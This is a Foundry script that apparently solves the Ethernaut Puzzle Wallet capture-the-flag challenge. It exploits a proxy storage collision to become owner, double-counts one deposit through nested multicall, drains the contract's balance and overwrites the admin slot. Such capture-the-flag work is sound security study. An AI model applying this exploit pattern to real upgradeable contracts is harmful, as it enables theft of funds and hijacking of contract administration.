// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/PuzzleWallet.sol";

contract PuzzleWalletScript is Script {
// research on payable multicalls https://github.com/Uniswap/v3-periphery/issues/52
    
    function run() public {
        address payable proxyAddress = payable(0x21C5025330E3aB520538Ad83e2fb7e57425557A4);
        address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        PuzzleProxy proxy = PuzzleProxy(proxyAddress);
        bytes32 implementationAddressSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        address implementationAddress = address(uint160(uint256((vm.load(proxyAddress, implementationAddressSlot)))));
        PuzzleWallet wallet = PuzzleWallet(implementationAddress);
        PuzzleWallet proxyWallet = PuzzleWallet(proxyAddress);
        console2.log(address(proxy));
        console2.log(address(wallet));
        console2.log(wallet.owner());
        console2.log(proxy.admin());
        console2.log(proxyWallet.owner());
        console2.log(proxyWallet.maxBalance());
        //proxyWallet.init(uint256(uint160(EOA)));
        proxy.proposeNewAdmin(EOA);
        console2.log(proxyWallet.owner());
        console2.log(proxy.admin());
        proxyWallet.addToWhitelist(EOA);
        proxyWallet.addToWhitelist(proxyAddress);
        console2.log(proxyAddress.balance);
        //proxyWallet.deposit{value: 1000000000000000}();
        //console2.log(proxyAddress.balance);
        //bytes memory data = abi.encodeWithSignature("multicall(bytes[])", proxyAddress, 1000000000000000,[abi.encodeWithSignature('deposit()')]);
        bytes[] memory depositCall = new bytes[](1);
        depositCall[0] = abi.encodeCall(PuzzleWallet.deposit, ());
        bytes memory data = abi.encodeCall(PuzzleWallet.multicall, (depositCall));
        bytes[] memory dataArray = new bytes[](2);
        dataArray[0] = data;
        dataArray[1] = data;
        proxyWallet.multicall{value: 1000000000000000}(dataArray);
        console2.log(proxyWallet.balances(EOA));
        proxyWallet.execute(EOA, 2000000000000000, bytes(""));
        console2.log(proxyAddress.balance);
        proxyWallet.setMaxBalance(uint(uint160(EOA)));
        console2.log(proxy.admin());
        //proxyWallet.setMaxBalance(uint256(uint160(EOA)));
        // wallet.init(0);
        // console2.log(wallet.owner());
        // wallet.addToWhitelist(EOA);

        vm.stopBroadcast();
    }
}
